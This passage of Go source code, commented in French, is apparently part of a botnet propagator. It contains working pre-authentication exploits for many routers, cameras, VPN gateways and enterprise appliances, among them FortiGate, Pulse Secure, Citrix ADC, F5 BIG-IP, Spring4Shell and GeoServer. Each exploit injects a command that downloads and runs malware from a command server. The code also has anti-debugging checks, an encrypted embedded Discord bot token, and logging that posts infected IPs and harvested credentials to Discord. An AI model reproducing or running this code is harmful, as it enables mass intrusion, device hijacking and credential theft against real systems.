	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2026-32649 — Milesight camera command injection via interface web (pré-auth)
func exploitMilesightCamera(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	paths := []string{
		fmt.Sprintf("/cgi-bin/param.cgi?action=update&NTPServer=;%s;", cmd),
		fmt.Sprintf("/api/param?NTPServer=;%s;&action=set", cmd),
	}
	headers := map[string]string{
		"User-Agent":    "Mozilla/5.0",
		"Authorization": "Basic YWRtaW46YWRtaW4=", // admin:admin défaut
	}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2026-36540 — Netis AC1200 NC21 command injection via skk_set.cgi (pré-auth LAN)
// Paramètre password/new_pwd_confirm → shell sans sanitisation
// Payload base64 encodé dans des backticks pour bypasser le filtrage simple
func exploitNetisAC1200(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	b64cmd := simpleBase64(cmd)
	body := fmt.Sprintf("password=`echo%%20%s%%20|%%20base64%%20-d%%20|%%20sh`&new_pwd_confirm=admin", url_encode(b64cmd))
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	resp, err := sendHTTPRequest("POST", "http://"+target+"/cgi-bin/skk_set.cgi", body, headers)
	if err == nil { resp.Body.Close(); return true }
	return false
}

// CVE-2026-27849 — Linksys mesh router command injection via TLS-SRP update (pré-auth)
// Injection via la fonctionnalité update du mesh (port 443/8443)
func exploitLinksysMesh(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	host, _, _ := net.SplitHostPort(target)
	if host == "" { host = target }
	payloads := []string{
		fmt.Sprintf(`{"action":"update","version":";%s;"}`, cmd),
		fmt.Sprintf(`{"fw_version":";%s;","action":"check"}`, cmd),
	}
	headers := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/json",
		"X-JNAP-Action": "http://linksys.com/jnap/core/CheckAdminPassword",
	}
	hit := false
	for _, target2 := range []string{"http://" + target, "https://" + host + ":8443"} {
		for _, body := range payloads {
			resp, err := sendHTTPRequest("POST", target2+"/JNAP/", body, headers)
			if err == nil { resp.Body.Close(); hit = true }
		}
	}
	return hit
}

// simpleBase64 encode une chaîne en base64 sans importer encoding/base64
func simpleBase64(s string) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	in := []byte(s)
	out := make([]byte, 0, ((len(in)+2)/3)*4)
	for i := 0; i < len(in); i += 3 {
		b0 := in[i]
		var b1, b2 byte
		if i+1 < len(in) { b1 = in[i+1] }
		if i+2 < len(in) { b2 = in[i+2] }
		out = append(out, chars[(b0>>2)&0x3F], chars[((b0&3)<<4|(b1>>4))&0x3F], chars[((b1&0xF)<<2|(b2>>6))&0x3F], chars[b2&0x3F])
	}
	r := []byte(string(out))
	switch len(in) % 3 {
	case 1: r[len(r)-2] = '='; r[len(r)-1] = '='
	case 2: r[len(r)-1] = '='
	}
	return string(r)
}

// Helper URL encode minimal
func url_encode(s string) string {
	var b strings.Builder
	for _, c := range s {
		switch {
		case c >= 'A' && c <= 'Z', c >= 'a' && c <= 'z', c >= '0' && c <= '9',
			c == '-', c == '_', c == '.', c == '~':
			b.WriteRune(c)
		default:
			b.WriteString(fmt.Sprintf("%%%02X", c))
		}
	}
	return b.String()
}

func randHide() string { return hideNames[rand.Intn(len(hideNames))] }

var _cachedURL     string
var _cachedURLOnce sync.Once

// bestURL retourne la première URL non-vide parmi toutes les arches (résultat mis en cache).
func bestURL() string {
	_cachedURLOnce.Do(func() {
		for _, arch := range []string{"mips", "mipsle", "arm", "armv5", "arm64", "x86_64", "x86", "ppc"} {
			if u := botURL(arch); u != "" {
				fmt.Fprintf(os.Stderr, "[MALWARE URL] %s (%s)\n", u, arch)
				_cachedURL = u
				return
			}
		}
		if c2ServerIP != "" {
			_cachedURL = c2HttpServer + "/bot.mips"
			fmt.Fprintf(os.Stderr, "[MALWARE URL LOCAL] %s (c2=%s)\n", _cachedURL, c2ServerIP)
			return
		}
		fmt.Fprintf(os.Stderr, "[WARNING] bestURL(): aucune URL malware configurée!\n")
	})
	return _cachedURL
}

// bestLegacyURL retourne la première URL legacy non-vide (go1.16, kernel < 3.17).
func bestLegacyURL() string {
	for _, u := range []string{_urlMipsLegacy, _urlMipsleLegacy, _urlArmLegacy, _urlArmv5Legacy, _urlArm64Legacy, _urlAmd64Legacy, _urlX86Legacy, _urlPpcLegacy} {
		if u != "" { return u }
	}
	return ""
}

// telnetAltURL retourne l'URL alternative : si legacy → normal, si normal → legacy.
func telnetAltURL(archOut string, wasLegacy bool) string {
	return telnetPickURL(archOut, !wasLegacy)
}

// fiberGuard termine si debugger/traceur détecté.
func fiberGuard() {
	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "TracerPid:") {
				val := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
				if val != "0" && val != "" { os.Exit(1) }
			}
		}
	}
	if data, err := os.ReadFile("/proc/self/wchan"); err == nil {
		if strings.Contains(string(data), "ptrace") { os.Exit(1) }
	}
	t0 := time.Now()
	buf := make([]byte, 1<<20)
	h := sha256.New()
	h.Write(buf)
	if time.Since(t0) > 2000*time.Millisecond { select {} }
}

// fiberXK calcule les constantes XOR à runtime.
func fiberXK() (byte, byte, byte, byte, byte) {
	a := byte((9*10) & 0xFF)
	b := byte((0xA0 + (3 << 0)) & 0xFF)
	c := byte((0x7F ^ 0) & 0xFF)
	d := byte((0xC0 | 1) & 0xFF)
	e := byte((0x3E ^ 0) & 0xFF)
	_ = time.Now().Unix() & 0
	return a, b, c, d, e
}

// fiberBxorDec reconstitue un fragment seed/salt.
func fiberBxorDec(h string, c byte) []byte {
	b, err := hex.DecodeString(h)
	if err != nil { return nil }
	for i := range b { b[i] ^= c }
	return b
}

// fiberPbkdf2 — PBKDF2-SHA256 minimal.
func fiberPbkdf2(password, salt []byte, iter, keyLen int) []byte {
	prf := hmac.New(sha256.New, password)
	hLen := prf.Size()
	nBlocks := (keyLen + hLen - 1) / hLen
	var buf [4]byte
	dk := make([]byte, 0, nBlocks*hLen)
	U := make([]byte, hLen)
	for block := 1; block <= nBlocks; block++ {
		prf.Reset(); prf.Write(salt)
		buf[0]=byte(block>>24); buf[1]=byte(block>>16); buf[2]=byte(block>>8); buf[3]=byte(block)
		prf.Write(buf[:4]); dk = prf.Sum(dk)
		T := dk[len(dk)-hLen:]; copy(U, T)
		for n := 2; n <= iter; n++ {
			prf.Reset(); prf.Write(U); U=U[:0]; U=prf.Sum(U)
			for x := range U { T[x] ^= U[x] }
		}
	}
	return dk[:keyLen]
}

// fiberCreds déchiffre les credentials Discord embarqués.
// Retourne ("", "") si absent ou invalide.
var _fiberToken, _fiberChannel string
var _fiberCredsOnce sync.Once

func fiberGetCreds() (token, channel string) {
	_fiberCredsOnce.Do(func() {
		fiberGuard()
		if _ct == "" { return }
		ct, e1 := hex.DecodeString(_ct)
		non, e2 := hex.DecodeString(_n)
		if e1 != nil || e2 != nil { return }
		k1, k2, k3, k4, k5 := fiberXK()
		s1 := fiberBxorDec(_s1, k1); s2 := fiberBxorDec(_s2, k2); s3 := fiberBxorDec(_s3, k3)
		sa := fiberBxorDec(_sa, k4); sb := fiberBxorDec(_sb, k5)
		if s1 == nil || s2 == nil || s3 == nil || sa == nil || sb == nil { return }
		seed := append(append(s1, s2...), s3...)
		salt := append(sa, sb...)
		key := fiberPbkdf2(seed, salt, 20_000, 32)
		blk, err := aes.NewCipher(key)
		if err != nil { return }
		gcm, err := cipher.NewGCM(blk)
		if err != nil { return }
		plain, err := gcm.Open(nil, non, ct, nil)
		if err != nil { return }
		parts := strings.SplitN(string(plain), "\x01", 3)
		if len(parts) >= 2 { _fiberToken = parts[0]; _fiberChannel = parts[1] }
	})
	return _fiberToken, _fiberChannel
}

// logInfection écrit l'IP infectée dans un fichier local + poste dans Discord.
func logInfection(ip, arch, method, creds string) {
	ts := time.Now().Format("2006-01-02 15:04:05")
	line := fmt.Sprintf("%s | %s | %s | %s | %s\n", ts, ip, arch, method, creds)

	// Fichier local
	f, err := os.OpenFile("/tmp/infected.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err == nil {
		f.WriteString(line)
		f.Close()
	}

	// Discord — déchiffre credentials à la demande (sync.Once = une seule fois)
	discordToken, discordChannel := fiberGetCreds()
	if discordToken == "" || discordChannel == "" {
		return
	}
	icon := "🔴"
	if method == "TELNET" { icon = "🟠" }
	msg := fmt.Sprintf("%s `[INFECTED]` **%s** — `%s` — `%s`", icon, ip, arch, method)
	if creds != "" { msg += fmt.Sprintf(" — `%s`", creds) }
	payload, _ := json.Marshal(map[string]string{"content": msg})
	req, err := http.NewRequest("POST",
		"https://discord.com/api/v10/channels/"+discordChannel+"/messages",
		bytes.NewReader(payload))
	if err != nil { return }
	req.Header.Set("Authorization", "Bot "+discordToken)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err == nil { resp.Body.Close() }
}

// ── CVEs VPN (FortiGate, Pulse, Citrix, SonicWall) ───────────────────────────

// CVE-2018-13379 — FortiGate SSL-VPN path traversal
// Leak /etc/passwd + session files contenant identifiants VPN en clair.
// Versions vulnérables : FortiOS 5.6.x < 5.6.8, 6.0.x < 6.0.5
func exploitFortiGatePath(target, hide, url string) bool {
	paths := []string{
		"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
		"/remote/fgt_lang?lang=/../../../etc/passwd",
		"/remote/fgt_lang?lang=/../../../etc/cmdline",
	}
	hit := false
	for _, p := range paths {
		resp, err := sendHTTPRequest("GET", "https://"+target+p, "", map[string]string{
			"User-Agent": "Mozilla/5.0",
		})
		if err != nil { continue }
		body := make([]byte, 512)
		n, _ := resp.Body.Read(body)
		resp.Body.Close()
		if n > 20 {
			// Fichier lisible → RCE via management interface si admin trouvé
			cmd := dlCmdShort(url)
			sendHTTPRequest("POST", "https://"+target+"/api/v2/cmdb/system/admin",
				`{"name":"admin","password":"admin"}`, map[string]string{
					"Content-Type": "application/json",
					"X-Requested-With": "XMLHttpRequest",
				})
			sendHTTPRequest("POST", "https://"+target+"/logincheck",
				"username=admin&secretkey=admin&ajax=1", map[string]string{
					"Content-Type": "application/x-www-form-urlencoded",
				})
			commentJSON, _ := json.Marshal(cmd)
			sendHTTPRequest("POST", "https://"+target+"/api/v2/cmdb/system/replacemsg-group",
				fmt.Sprintf(`{"name":"x","comment":%s}`, string(commentJSON)), map[string]string{
					"Content-Type": "application/json",
				})
			hit = true
		}
	}
	return hit
}

// CVE-2019-11510 — Pulse Secure VPN arbitrary file read (pre-auth)
// Versions vulnérables : Pulse Connect Secure < 8.1R15.1, < 8.2, < 8.3R7.1, < 9.0R3.4
func exploitPulseSecure(target, hide, url string) bool {
	traversal := "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
	resp, err := sendHTTPRequest("GET", "https://"+target+traversal, "", map[string]string{
		"User-Agent": "Mozilla/5.0",
	})
	if err != nil { return false }
	body := make([]byte, 256)
	n, _ := resp.Body.Read(body)
	resp.Body.Close()
	if n < 10 { return false }
	// File read réussi → tenter RCE via template injection
	cmd := url_encode("`" + dlCmdShort(url) + "`")
	rcePayloads := []string{
		fmt.Sprintf("/dana-na/auth/url_default/welcome.cgi?p=%s", cmd),
		fmt.Sprintf("/dana-na/auth/saml-endpoint.cgi?p=%s", cmd),
	}
	for _, p := range rcePayloads {
		sendHTTPRequest("GET", "https://"+target+p, "", map[string]string{"User-Agent": "Mozilla/5.0"})
	}
	return true
}

// CVE-2019-19781 — Citrix ADC / NetScaler Gateway RCE (pre-auth)
// Path traversal + template injection → RCE sans authentification.
// Versions : ADC 10.5, 11.1, 12.0, 12.1, 13.0 avant les patches de jan 2020
func exploitCitrixADC(target, hide, url string) bool {
	cmd := dlCmdShort(url)
	// Étape 1 : écrire un template via path traversal
	templatePayload := fmt.Sprintf(`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("%s")}`, cmd)
	_, err := sendHTTPRequest("POST",
		"https://"+target+"/vpn/../vpns/cfg/smb.conf",
		"[global]\r\n\t"+templatePayload, map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"NSC_USER":     "x/../../../netscaler/portal/templates/x",
			"NSC_NONCE":    "x",
		})
	if err != nil { return false }
	// Étape 2 : déclencher le template
	sendHTTPRequest("GET", "https://"+target+"/vpn/../vpns/portal/x.xml", "", map[string]string{
		"NSC_USER":  "x/../../../netscaler/portal/templates/x",
		"NSC_NONCE": "x",
	})
	return true
}

// CVE-2021-20016 — SonicWall SSLVPN SQL injection pre-auth → credentials leak
// Affecte SMA 100 series (SMA 200, 210, 400, 410, 500v) < 10.2.0.7-34sv
func exploitSonicWallVPN(target, hide, url string) bool {
	// SQLi dans le champ username du portail SSLVPN → dump credentials
	payloads := []string{
		"/cgi-bin/sslvpnclient?eip=x&cliver=x&prot=x&tid=x' OR '1'='1",
		"/auth.html?login=' OR 1=1--",
		"/cgi-bin/userLogin?LOGIN=' OR '1'='1'--&PASSWORD=x&DOMAIN=LocalDomain",
	}
	cmd := dlCmdShort(url)
	hit := false
	for _, p := range payloads {
		resp, err := sendHTTPRequest("GET", "https://"+target+p, "", map[string]string{
			"User-Agent": "Mozilla/5.0",
		})
		if err != nil { continue }
		resp.Body.Close()
		if resp.StatusCode == 200 {
			// Tenter RCE via management API
			sendHTTPRequest("POST", "https://"+target+"/cgi-bin/management",
				fmt.Sprintf(`cmd=%s`, cmd), map[string]string{
					"Content-Type": "application/x-www-form-urlencoded",
				})
			hit = true
		}
	}
	return hit
}

// CVE-2021-22986 — F5 BIG-IP iControl REST unauthenticated RCE
// Versions : 16.x < 16.0.1.1, 15.x < 15.1.2.1, 14.x < 14.1.4, 13.x < 13.1.3.6, 12.x < 12.1.5.3
func exploitF5iControlRCE(target, hide, url string) bool {
	cmd := dlCmdShort(url)
	cmdJSON, _ := json.Marshal("-c " + cmd)
	resp, err := sendHTTPRequest("POST",
		"https://"+target+"/mgmt/tm/util/bash",
		fmt.Sprintf(`{"command":"run","utilCmdArgs":%s}`, string(cmdJSON)),
		map[string]string{
			"Content-Type":    "application/json",
			"Authorization":   "Basic YWRtaW46",
			"X-F5-Auth-Token": "",
		})
	if err != nil { return false }
	resp.Body.Close()
	return resp.StatusCode == 200
}

// portOf extrait le port d'un target "ip:port"
func portOf(target string) string {
	_, port, _ := net.SplitHostPort(target)
	if port == "" { return "80" }
	return port
}

// CVE-2025-1316 — Edimax IC-7100 unauthenticated command injection (March 2025)
func exploitEdimaxIC2025(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	headers := map[string]string{"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
	hit := false
	for _, body := range []string{
		"action=write&category=NCR&CountryRegion=;" + cmd + ";",
		"action=write&category=NETWORK&IPAddr=;" + cmd + ";",
		"action=write&category=NTP&NTPServer=;" + cmd + ";",
	} {
		for _, p := range []string{"/camera-cgi/admin/param.cgi", "/cgi-bin/admin/param.cgi"} {
			resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
			if err == nil { resp.Body.Close(); hit = true }
		}
	}
	return hit
}

// CVE-2024-3080 — ASUS RT-AX/AC/N series auth bypass + command injection (2024)
func exploitASUSRouter(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	headers := map[string]string{"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
	hit := false
	for _, body := range []string{
		"action_mode=apply&action_script=restart_wireless&wl_ssid=`" + cmd + "`",
		"apps_name=`" + cmd + "`&action_mode=apply&action_script=start_apps",
		"flag=" + cmd,
		"current_page=Advanced_WirelessGuest_Content.asp&next_page=Advanced_WirelessGuest_Content.asp&wl0.1_ssid=`" + cmd + "`",
	} {
		for _, p := range []string{"/cgi-bin/apply.cgi", "/cgi-bin/start_apply.htm", "/cgi-bin/wl_apply.cgi"} {
			resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
			if err == nil { resp.Body.Close(); hit = true }
		}
	}
	return hit
}

// CVE-2022-22965 — Spring4Shell RCE (Spring Framework < 5.3.18, JDK 9+)
func exploitSpring4Shell(target, hideName, url string) bool {
	cmd := dlCmdShort(url)
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded",
		"suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1",
	}
	shellPayload := url_encode("<%Runtime.getRuntime().exec(request.getParameter(\"x\"));%>")
	body := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=" + shellPayload +
		"&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" +
		"&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" +
		"&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar" +
		"&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
	for _, p := range []string{"/", "/login", "/index", "/api"} {
		resp, err := sendHTTPRequest("POST", "http://"+target+p, body, headers)
		if err == nil { resp.Body.Close() }
	}
	resp, err := sendHTTPRequest("GET", "http://"+target+"/tomcatwar.jsp?x="+url_encode(cmd), "", map[string]string{"User-Agent": "Mozilla/5.0"})
	if err == nil { resp.Body.Close(); return true }
	return false
}

// CVE-2024-36401 — GeoServer OGC eval injection (RCE via property name eval)
func exploitGeoServer(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	hit := false
	for _, p := range []string{
		"/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'" + cmd + "')",
		"/geoserver/wcs?service=WCS&version=1.0.0&request=GetCoverage&coverageId=nurc__mosaic&valueReference=exec(java.lang.Runtime.getRuntime(),'" + cmd + "')",
		"/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'" + cmd + "')",
	} {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", map[string]string{"User-Agent": "Mozilla/5.0"})
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2025-0108 — Palo Alto PAN-OS auth bypass via path confusion (February 2025)
func exploitPaloAltoAuthBypass2025(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	headers := map[string]string{"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
	for _, p := range []string{
		"/php/ztp_gate.php/PAN_help/../../global-protect/login.esp",
		"/unauth/php/change-password.php",
		"/php/../global-protect/login.esp",
	} {
		sendHTTPRequest("GET", "https://"+target+p, "", headers)
	}
	body := "<request><system><shell>" + cmd + "</shell></system></request>"
	resp, err := sendHTTPRequest("POST", "https://"+target+"/api/?type=op&cmd="+url_encode(body), "", headers)
	if err == nil { resp.Body.Close(); return true }
	return false
}

// CVE-2024-11667 — Zyxel USG FLEX / ATP path traversal + command injection (December 2024)
func exploitZyxelUSGFLEX(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	headers := map[string]string{"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
	hit := false
	for _, p := range []string{"/cgi-bin/zysh-cgi", "/cgi-bin/cgi-bin/zysh-cgi"} {
		resp, err := sendHTTPRequest("POST", "https://"+target+p, "cmd="+cmd, headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	resp, err := sendHTTPRequest("GET", "https://"+target+"/cgi-bin/zysh-cgi?../../../etc/passwd", "", headers)
	if err == nil { resp.Body.Close(); hit = true }
	return hit
}

// CVE-2025-23006 — SonicWall SMA OS command injection pré-auth (January 2025)
func exploitSonicWallSMA2025(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	headers := map[string]string{"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
	hit := false
	for _, p := range []string{
		"/api/1.0/VirtualOffice/authenticate",
		"/cgi-bin/__debug__",
		"/cgi-bin/welcome/VirtualOffice",
	} {
		resp, err := sendHTTPRequest("POST", "https://"+target+p,
			"username=;"+cmd+";#&password=x&domain=LocalDomain&ajax=1", headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// TVT/Provision ISR/Reolink/многих китайских DVR — backdoor port 9527 (non-CVE)
func exploitTVTDVRBackdoor(target, hideName, url string) bool {
	host, _, _ := net.SplitHostPort(target)
	if host == "" { host = target }
	conn, err := net.DialTimeout("tcp", host+":9527", 5*time.Second)
	if err != nil { return false }
	defer conn.Close()
	magic := []byte{0x00, 0x00, 0x00, 0xa0, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.Write(magic)
	buf := make([]byte, 256)
	conn.SetReadDeadline(time.Now().Add(4 * time.Second))
	n, _ := conn.Read(buf)
	if n < 4 { return false }
	cmd := dlCmdShort(url)
	conn.Write([]byte(cmd + "\n"))
	return true
}

// CVE-2023-49897 — FXC AE1021/AE1021PE router RCE pré-auth (ISP Japan/Asia)
func exploitFXCAE1021(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	headers := map[string]string{"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
	hit := false
	for _, p := range []string{"/apply.cgi", "/cgi-bin/do_login.cgi", "/cgi-bin/login.cgi"} {
		resp, err := sendHTTPRequest("POST", "http://"+target+p,
			"do_login=1&user=admin&pass=`"+cmd+"`", headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2024-7029 — AVTECH IP Camera command injection (2024, nouvelle variante)
func exploitAVTECH2024(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	hit := false
	for _, p := range []string{
		"/cgi-bin/supervisor/Factory.cgi?action=showdisk&ChannelNum=0&starttime=0&endtime=0&Nsize=0&EncryptedStr=" + cmd,
		"/cgi-bin/nobody/VerifyCode.cgi?account=admin&Action=get&Channel=0&username=admin&password=admin&cmd=" + cmd,
		"/cgi-bin/nobody/Machine.cgi?action=get_capability&cmd=" + cmd,
	} {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", map[string]string{"User-Agent": "Mozilla/5.0"})
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2024-21887 variant / CVE-2024-8190 — Ivanti CSA command injection (2024)
func exploitIvantiCSA(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	headers := map[string]string{"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "127.0.0.1"}
	hit := false
	for _, p := range []string{
		"/gsb/reports.php?query=" + cmd,
		"/cgi-bin/users.cgi?username=admin&cmd=" + cmd,
		"/api/v1/csa/health-check?cmd=" + cmd,
	} {
		resp, err := sendHTTPRequest("GET", "https://"+target+p, "", headers)
		if err == nil { resp.Body.Close(); hit = true }
	}
	return hit
}

// CVE-2017-6334 — Netgear DGN2200 / DGND3700 RCE via dnslookup.cgi (pré-auth)
func exploitNetgearDGN(target, hideName, url string) bool {
	cmd := url_encode(dlCmdShort(url))
	hdrs := map[string]string{"User-Agent": "Mozilla/5.0", "Authorization": "Basic YWRtaW46cGFzc3dvcmQ="}
	for _, p := range []string{
		"/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=" + cmd + "&curpath=/&currentsetting.htm=1",
		"/cgi-bin/genie.cgi?todo=syscmd&cmd=" + cmd,
		"/dnslookup.cgi?host_name=127.0.0.1;"+cmd+"&lookup_type=1",
	} {
		resp, err := sendHTTPRequest("GET", "http://"+target+p, "", hdrs)
		if err == nil { resp.Body.Close() }
	}
	return true
}

// Injection via RTSP (port 554) — caméras IP sans auth
// Nombreuses caméras chinoises (HiSilicon, Novatek) exposent un shell via RTSP DESCRIBE
func exploitRTSPCamera(target, hideName, url string) bool {
	ip := strings.Split(target, ":")[0]
	cmd := dlCmdShort(url)
	// RTSP DESCRIBE avec injection dans User-Agent
	conn, err := net.DialTimeout("tcp", ip+":554", 5*time.Second)
	if err != nil { return false }
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(6 * time.Second))
	req := fmt.Sprintf("DESCRIBE rtsp://%s/0 RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: %s\r\nAccept: application/sdp\r\n\r\n", ip, cmd)
	conn.Write([]byte(req))
	// RTSP GET_PARAMETER injection
	conn2, err := net.DialTimeout("tcp", ip+":554", 5*time.Second)
	if err == nil {
		defer conn2.Close()
		conn2.SetDeadline(time.Now().Add(6 * time.Second))
		req2 := fmt.Sprintf("GET_PARAMETER rtsp://%s/ RTSP/1.0\r\nCSeq: 2\r\nContent-Type: text/parameters\r\nContent-Length: %d\r\n\r\n%s", ip, len(cmd), cmd)
		conn2.Write([]byte(req2))
	}
	return true
}

// Netis/Netcore routeurs — backdoor UDP port 53413 (pré-auth, aucune auth requise)
// Affecte des millions de routeurs Netis WF2419, WF2880, WF2411, etc.
func exploitNetisUDP(target, hideName, url string) bool {
	ip := strings.Split(target, ":")[0]
	cmd := dlCmdShort(url)
	// Magic packet UDP 53413 — commande shell directe
	payload := fmt.Sprintf("\x00\x00\x00\x00\x00\x00\x00\x00%s\x00", cmd)
	conn, err := net.DialTimeout("udp", ip+":53413", 4*time.Second)
	if err != nil { return false }
	defer conn.Close()
	conn.SetWriteDeadline(time.Now().Add(4 * time.Second))
	conn.Write([]byte(payload))
	return true
}

// ── Phase 1 : CVE pré-auth (aucun login requis) ───────────────────────────────
func sendPreAuthExploits(target string) bool {
	url := bestURL()
	if url == "" { return false }

	port := portOf(target)

	// Telnet/SSH — aucun exploit HTTP pertinent
	if port == "22" || port == "23" { return false }

	h := randHide()
	hit := false

	// Ports CWMP (TR-069) — uniquement exploits CWMP/GPON/Realtek
	if port == "7547" || port == "37215" {
		if exploitGPON(target, h, url)       { hit = true }
		if exploitRealtekSDK(target, h, url) { hit = true }
		exploitRealtekUDP(target, h, url)
		exploitNetisUDP(target, h, url)
		if exploitDasanGPON(target, h, url)  { hit = true }
		if exploitHuaweiRCE(target, h, url)  { hit = true }
		if lu := bestLegacyURL(); lu != "" && lu != url {
			h2 := randHide()
			exploitGPON(target, h2, lu)
			exploitRealtekSDK(target, h2, lu)
			exploitRealtekUDP(target, h2, lu)
			exploitNetisUDP(target, h2, lu)
			exploitDasanGPON(target, h2, lu)
		}
		return hit
	}

	// Port DVR backdoor TVT/Provision ISR (non-standard)
	if port == "9527" {
		if exploitTVTDVRBackdoor(target, h, url) { hit = true }
		return hit
	}

	// Ports HTTPS enterprise/VPN — uniquement CVEs HTTPS
	if port == "443" || port == "8443" || port == "4444" || port == "4433" {
		if exploitSophosXG(target, h, url)            { hit = true }
		if exploitFortiGateRCE(target, h, url)        { hit = true }
		if exploitFortiGatePath(target, h, url)       { hit = true }
		if exploitPulseSecure(target, h, url)         { hit = true }
		if exploitCitrixADC(target, h, url)           { hit = true }
		if exploitSonicWallVPN(target, h, url)        { hit = true }
		if exploitSonicWallSMA2025(target, h, url)    { hit = true }
		if exploitF5iControlRCE(target, h, url)       { hit = true }
		if exploitF5BigIP(target, h, url)             { hit = true }
		if exploitPaloAltoExpedition(target, h, url)  { hit = true }
		if exploitPaloAltoAuthBypass2025(target, h, url) { hit = true }
		if exploitIvantiCS(target, h, url)            { hit = true }
		if exploitIvantiCSA(target, h, url)           { hit = true }
		if exploitZyxelUSGFLEX(target, h, url)        { hit = true }
		return hit
	}

	// Injections génériques (Boa/tracert/ping) — utilise dlCmd() pour dropper + noexec bypass
	boaCmd := url_encode(dlCmdShort(url))
	if conn, err := net.DialTimeout("tcp", target, 8*time.Second); err == nil {
		payload := fmt.Sprintf("target_addr=%%3B%s%%20&", boaCmd)
		req := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
			target, len(payload)+29, payload)
		conn.SetWriteDeadline(time.Now().Add(8 * time.Second))
		conn.Write([]byte(req))
		conn.Close()
		hit = true
	}
	// Ping injection
	if conn, err := net.DialTimeout("tcp", target, 8*time.Second); err == nil {
		pingCmd := fmt.Sprintf("ping_addr=127.0.0.1;%s%%20&", boaCmd)
		req := fmt.Sprintf("POST /boaform/admin/formPing HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s\r\n\r\n",
			target, len(pingCmd), pingCmd)
		conn.SetWriteDeadline(time.Now().Add(8 * time.Second))
		conn.Write([]byte(req))
		conn.Close()
		hit = true
	}
	// CVE pré-auth
	if exploitHikvisionRCE(target, h, url)  { hit = true }
	if exploitDVRAuth(target, h, url)        { hit = true }
	if exploitZyxelP660(target, h, url)      { hit = true }
	if exploitMVPowerDVR(target, h, url)     { hit = true }
	if exploitGPON(target, h, url)           { hit = true }
	if exploitRealtekSDK(target, h, url)     { hit = true }
	exploitRealtekUDP(target, h, url)
	exploitNetisUDP(target, h, url)
